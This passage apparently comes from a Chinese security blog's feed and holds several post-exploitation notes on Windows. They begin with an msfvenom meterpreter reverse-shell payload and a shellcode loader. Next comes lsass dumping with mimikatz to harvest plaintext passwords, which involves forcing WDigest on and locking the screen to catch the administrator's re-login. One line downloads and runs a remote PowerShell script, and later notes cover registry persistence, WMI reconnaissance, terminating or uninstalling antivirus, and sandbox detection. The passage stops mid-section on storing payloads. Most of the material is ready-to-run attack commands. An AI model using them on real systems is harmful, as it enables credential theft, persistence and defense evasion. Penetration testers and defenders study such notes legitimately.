<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444</span><br></pre></td></tr></table></figure>
<p>加载器进行加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\temp&gt;sc.exe shellcode</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Mimikatz明文密码抓取]]></title>
      <url>https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html</url>
      <content type="html"><![CDATA[<h2><span id="mimikatz">mimikatz</span></h2><h3><span id="procdumpmimikatz">procdump+mimikatz</span></h3><p><strong>KB2871997</strong></p>
<p>在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。</p>
<p>当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）</p>
<p>以下是支持的系统:</p>
<ul>
<li>Windows 7</li>
<li>Windows 8</li>
<li>Windows 8.1</li>
<li>Windows Server 2008</li>
<li>Windows Server 2012</li>
<li>Windows Server 2012R 2</li>
</ul>
<p>原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码</p>
<p>利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p>
<p>抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码</p>
<p>procdump64.exe导出lsass.dmp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
<p>使用本地的mimikatz.exe读取lsass.dmp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_1.png" alt="mimi_1"></p>
<p>无法读取到密码。</p>
<p>在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p>
<p><strong>开启Wdigest Auth</strong></p>
<ul>
<li><p>cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
</li>
<li><p>powershell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>meterpreter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>关闭Wdigest Auth</strong></p>
<p>关闭命令如下：</p>
<ul>
<li><p>cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
</li>
<li><p>powershell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>meterpreter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>强制锁屏</strong></p>
<p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p>
<p>强制锁屏，让管理员重新登录。</p>
<ul>
<li><p>cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
</li>
<li><p>powershell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation </span><br><span class="line">&#123;</span><br><span class="line">$signature = @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line">$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure>
</li>
</ul>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://x.x.x.x/Lock-WorkStation.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure>
<p>重新读取，可读到明文密码。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_2.png" alt="mimi_2"></p>
<h3><span id="sqldumper-mimikatz">SqlDumper + mimikatz</span></h3><p>SqlDumper.exe是从SQL Server安装目录下提取出来的，<strong>功能和Procdump相似，</strong>并且也是微软出品的，体积远小于Procdump，也具备一定的免杀功能。SqlDumper.exe默认存放在C:\Program Files\Microsoft SQL Server\number\Shared，number代表SQL Server的版本，<strong>参考如下：</strong></p>
<p>140 for SQL Server 2017</p>
<p>130 for SQL Server 2016</p>
<p>120 for SQL Server 2014</p>
<p>110 for SQL Server 2012</p>
<p>100 for SQL Server 2008</p>
<p>90 for SQL Server 2005</p>
<p>如果目标机器没有安装SQL Server，可以自己上传一个SqlDumper.exe。</p>
<p><strong>用法：</strong></p>
<p><strong>1.查看lsass.exe 的ProcessID</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc |findstr lsass.exe</span><br></pre></td></tr></table></figure>
<p><strong>2.导出dump文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqldumper.exe ProcessID 0 0x01100</span><br></pre></td></tr></table></figure>
<p><strong>3.mimikatz加载dump文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<h3><span id="sharpdump-mimikatz">SharpDump+ mimikatz</span></h3><p>项目地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/GhostPack/SharpDump</span><br></pre></td></tr></table></figure>
<p>编译生成的exe文件只有10KB左右，而且可过360。</p>
<p><strong>用法：</strong></p>
<p><strong>1.在管理员权限下运行生成debug480.bin</strong></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_5.png" alt="mimi_5"></p>
<p>修改debug480.bin为zip文件解压得到导出文件。</p>
<p><strong>mimikatz加载dump文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump debug480&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mimi_6.png" alt="mimi_6"></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[权限维持-注册表]]></title>
      <url>https://uknowsec.cn/posts/uncategorized/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E6%B3%A8%E5%86%8C%E8%A1%A8.html</url>
      <content type="html"><![CDATA[<h3><span id="runrunonce-keys">Run/RunOnce Keys</span></h3><p>用户级</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
<p>管理员</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>HKEY_CURRENT_USER</code> 代表当前用户，当前用户登录后才执行的操作。</p>
</li>
<li><p><code>HKEY_LOCAL_MACHINE</code>代表当前机器，所有操作在用户登录后就执行了。</p>
</li>
<li><p><code>Run</code> 键值代表着开机启动项，也就是说在这个项下的键值会随着开机启动（这里的开机是指用户登录，也就是说只要有登录操作就会执行，注销然后登录，也会执行这个键值）。</p>
</li>
<li><p><code>RunOnce</code> 键值类似于 Run 键值，唯一的区别在于，<code>RunOnce</code> 键值只执行一次，操作执行后会被自动删除。</p>
</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_1.png" alt="reg_1"></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_2.png" alt="reg_2"></p>
<h3><span id="bootexecute-key">BootExecute Key</span></h3><p>smss.exe进程是微软®公司为其发布的基于Windows NT系统（200/XP/Vista以及Win7等）定义的一个重要系统核心程序，官方描述为：Windows会话管理器。</p>
<p>smss.exe这是一个Windows后台进程，会随着系统一起启动。</p>
<p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_3.png" alt="reg_3"></p>
<ul>
<li><code>autocheck autochk *</code>。如果电脑出现蓝屏，将会在电脑重启后自动运行自检程序，试图对系统中存在的错误进行修复。</li>
<li>Autochk.exe 是<a href="https://baike.baidu.com/item/Windows%20NT" target="_blank" rel="noopener">Windows NT</a>架构的系统中的一个文件，用于确定卷检测（或磁盘检查）任务是手动安排的，还是由于文件系统发现卷处于“dirty”状态而自动安排的，然后判断是否在计算机启动时自动执行<a href="https://baike.baidu.com/item/chkdsk/1115947" target="_blank" rel="noopener">chkdsk</a>命令强制检测卷（磁盘），并将相应的消息写入应用程序事件日志中。</li>
</ul>
<h3><span id="userinit-key">Userinit Key</span></h3><p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit这个注册表键的作用是在用户进行登陆时，winlogon运行指定的程序。根据<a href="https://technet.microsoft.com/en-us/library/cc939862.aspx" target="_blank" rel="noopener">官方文档</a>,可以更改它的值来添加与删除程序。</p>
<p>WinLogon进程加载的login scripts,具体键值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_4.png" alt="reg_4"></p>
<h3><span id="startup-keys">Startup Keys</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1554090222814.png" alt="1554090222814"></p>
<ul>
<li><code>Common Administrative Tools</code>自定义管理工具目录</li>
<li><code>Common AppData</code>自定义系统文件目录</li>
<li><code>Common Desktop</code>自定义桌面目录</li>
<li><code>Common Documents</code>自定义文档目录</li>
<li><code>Common Programs</code>自定义程序目录</li>
<li><code>Common Start Menu</code>自定义开始菜单目录</li>
<li><code>Common Startup</code>自定义开机启动项目录</li>
</ul>
<h3><span id="browser-helper-objects">Browser Helper Objects</span></h3><p>本质上是Internet Explorer启动时加载的DLL模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure>
<p>这个注册表项的每个子项都保存了一个浏览器助手的信息，所有浏览器助手在用户登录后以dll的方式加载，没有独立的进程，因此很难发现。并且必须在安全模式下才能删除。</p>
<h4><span id="生成dll">生成DLL</span></h4><p><a href="https://blog.csdn.net/feier7501/article/details/11266345" target="_blank" rel="noopener">C++开发BHO之HelloWorld</a></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_5.png" alt="reg_5"></p>
<p>设置项目<code>MFC的使用</code>和<code>ATL的使用</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_8.png" alt="reg_5"></p>
<h4><span id="注册dll">注册DLL</span></h4><p>需要管理员权限，命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 helloworld.dll /s</span><br></pre></td></tr></table></figure>
<p><code>/s</code>参数用来去掉注册成功的提示框</p>
<p>卸载dll：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsve32 helloworld.dll /s /u</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_7.png" alt="reg_7"></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_6.png" alt="reg_6"></p>
<h4><span id="在ie页面注入js">在IE页面注入js</span></h4><p>可参考以下开源工程做进一步修改：</p>
<p><a href="https://github.com/xiyiaoo/BHO" target="_blank" rel="noopener">https://github.com/xiyiaoo/BHO</a></p>
<h3><span id="appinit_dlls">AppInit_DLLs</span></h3><p>加载User32.dll会加载的DLL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>
<p>-　　<code>AppInit_DLLs</code>键的值可以是一个dll的文件名或一组dll的文件名(通过逗号或空格来分隔)，由于空格是用来分隔文件名的，因此dll文件名不能含有空格。第一个dll的文件名可以包含路径，但其他的dll包含的路径将被忽略。<br>-　　<code>LoadAppInit_DLLs</code>键的值表示<code>AppInit_DLLs</code>键是否有效，为了让<code>AppInit_DLLs</code>键的值有效，需要将<code>LoadAppInit_DLLs</code>的值设置为1。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reg_9.png" alt="reg_9"></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[权限维持-WMI]]></title>
      <url>https://uknowsec.cn/posts/notes/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-WMI.html</url>
      <content type="html"><![CDATA[<h3><span id="wmi">WMI</span></h3><p>WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。</p>
<h4><span id="检索系统信息">检索系统信息</span></h4><h5><span id="检索系统已安装的软件">检索系统已安装的软件</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_1.png" alt="wmic_1"></p>
<h5><span id="搜索系统运行服务">搜索系统运行服务</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_2.png" alt="wmic_1"></p>
<h5><span id="搜索运行中的程序">搜索运行中的程序</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_3.png" alt="wmic_3"></p>
<h5><span id="搜索启动程序">搜索启动程序</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_4.png" alt="wmic_4"></p>
<h5><span id="搜索共享驱动盘">搜索共享驱动盘</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic netuser list brief |more</span><br></pre></td></tr></table></figure>
<h5><span id="搜索用户名">搜索用户名</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_5.png" alt="wmic_5"></p>
<h5><span id="搜索计算机域控制器">搜索计算机域控制器</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic ntdomain list brief</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_6.png" alt="wmic_6"></p>
<h5><span id="搜索登录用户">搜索登录用户</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logon list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_7.png" alt="wmic_7"></p>
<h5><span id="搜索已安装的安全更新">搜索已安装的安全更新</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_8.png" alt="wmic_8"></p>
<h4><span id="执行任务">执行任务</span></h4><p>WMIC不仅仅只是用于检索系统信息。在渗透测试中， 使用适当的命令，它也可以执行各种有用的任务。</p>
<h5><span id="卸载和重新安装程序">卸载和重新安装程序</span></h5><p>在渗透测试中， 我们经常遇到反病毒程序阻止payload运行。 这时候我们可以通过WMIC命令来卸载反病毒程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product where &quot;name like &apos;%Office%&apos;&quot; get name</span><br><span class="line">wmic product where name=&quot;Office&quot; call uninstall</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_9.png" alt="wmic_9"></p>
<h4><span id="运行程序管理">运行程序管理</span></h4><p>上面我们提到卸载反病毒程序来运行payload。 但是有时候我们没有足够的权限去卸载程序。 这时我们可以通过WMIC命令来停止运行反病毒服务。</p>
<ol>
<li><p>第一步， 找到反病毒程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where &quot;name like &apos;%forti%&apos;&quot; get name</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li>第二步， 通过WMIC命令来停止运行反病毒服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;FortiTray.exe&quot; call terminate</span><br></pre></td></tr></table></figure>
<h3><span id="powershell">Powershell</span></h3><p>自从PowerShell的出现，WMI功能已经被完全整合到了PowerShell里面。在PowerShell中， WMI拥有多个类型的种类，每个种类都代表一个内部组件：Win32_proces代表当前系统所运行程序。 Win32_Service代表当前系统所运行服务等等。</p>
<h4><span id="侦查">侦查</span></h4><h5><span id="操作系统相关信息">操作系统相关信息</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_10.png" alt="wmic_10"></p>
<h5><span id="文件目录列表">文件/目录列表</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile</span><br></pre></td></tr></table></figure>
<h5><span id="磁盘卷列表">磁盘卷列表</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_12.png" alt="wmic_12"></p>
<h5><span id="注册表操作">注册表操作</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv</span><br><span class="line">Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">Get-ItemProperty OptionalComponents</span><br></pre></td></tr></table></figure>
<h5><span id="当前进程">当前进程</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_14.png" alt="wmic_14"></p>
<h5><span id="列举服务">列举服务</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_15.png" alt="wmic_15"></p>
<h5><span id="日志">日志</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent</span><br></pre></td></tr></table></figure>
<h5><span id="登陆账户">登陆账户</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_15.png" alt="wmic_15"></p>
<h5><span id="共享">共享</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Share</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_17.png" alt="wmic_17"></p>
<h5><span id="补丁">补丁</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering</span><br></pre></td></tr></table></figure>
<h5><span id="杀毒软件">杀毒软件</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br></pre></td></tr></table></figure>
<h4><span id="虚拟机检测">虚拟机检测</span></h4><p>（1）判断TotalPhysicalMemory和NumberOfLogicalProcessors</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$VMDetected = $False</span><br><span class="line">$Arguments = @&#123;</span><br><span class="line"> Class = &apos;Win32_ComputerSystem&apos;</span><br><span class="line"> Filter = &apos;NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648&apos;</span><br><span class="line">&#125;</span><br><span class="line">if (Get-WmiObject @Arguments) &#123; </span><br><span class="line">$VMDetected = $True</span><br><span class="line">&quot;In vm&quot;</span><br><span class="line"> &#125; </span><br><span class="line"> else&#123;</span><br><span class="line"> &quot;Not in vm&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>（2）判断虚拟机进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$VMwareDetected = $False</span><br><span class="line">$VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter &apos;Manufacturer LIKE</span><br><span class="line">&quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&apos;</span><br><span class="line">$VMBios = Get-WmiObject Win32_BIOS -Filter &apos;SerialNumber LIKE &quot;%VMware%&quot;&apos;</span><br><span class="line">$VMToolsRunning = Get-WmiObject Win32_Process -Filter &apos;Name=&quot;vmtoolsd.exe&quot;&apos;</span><br><span class="line">if ($VMAdapter -or $VMBios -or $VMToolsRunning) </span><br><span class="line">&#123; $VMwareDetected = $True </span><br><span class="line">&quot;in vm&quot;</span><br><span class="line">&#125; </span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">&quot;not in vm&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="存储payload">存储payload</span></h4><p>【管理员权限】</p>
